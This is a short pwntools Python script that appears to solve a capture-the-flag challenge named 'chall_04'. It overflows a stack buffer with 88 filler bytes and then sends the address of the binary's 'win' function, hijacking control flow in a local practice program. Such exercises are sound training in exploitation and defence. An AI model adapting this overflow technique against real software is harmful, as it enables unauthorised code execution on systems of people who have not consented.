#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_04')

p = process(binary.path)

p.recvuntil('Follow the compass and it\'ll point you in the right direction')
p.recvline()

payload  = b''
payload += 88 * b'A'
payload += p64(binary.sym.win)

p.sendline(payload)
p.interactive()
